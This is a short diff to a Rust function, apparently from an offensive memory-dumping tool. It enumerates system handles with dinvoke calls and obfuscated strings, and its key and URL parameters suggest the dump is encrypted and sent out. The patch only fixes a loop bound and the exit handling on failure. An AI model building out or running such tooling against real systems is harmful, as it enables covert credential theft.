@@ -73,7 +73,7 @@ pub fn dump(key: &str, url: &str) {
         
         println!("{}{}{}",&lc!("[+] Retrieved "), (*shi).number_of_handles, &lc!(" handles. Starting analysis..."));
         let mut shtei: *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO = std::mem::transmute(&(*shi).handles);
-        for counter in 0..((*shi).number_of_handles - 1) 
+        for counter in 0..(*shi).number_of_handles 
         {
             
             if counter % 10000 == 0 && counter > 0
@@ -419,7 +419,7 @@ pub fn dump(key: &str, url: &str) {
                                 let _r = dinvoke::close_handle(map_handle).unwrap();
                                 let _r = dinvoke::close_handle(transaction_handle).unwrap();
 
-                                break;
+                                return;
                             }
                             else 
                             {
@@ -436,12 +436,11 @@ pub fn dump(key: &str, url: &str) {
             }
 
             shtei = shtei.add(1);
+            
+        } 
+        
+        println!("{}", &lc!("[x] Could not retrieve a valid handle. Exiting."));
 
-            if counter == (*shi).number_of_handles - 1
-            {
-                println!("{}", &lc!("[x] Could not retrieve a valid handle. Exiting."));
-            }
-        }            
     }
 }
 
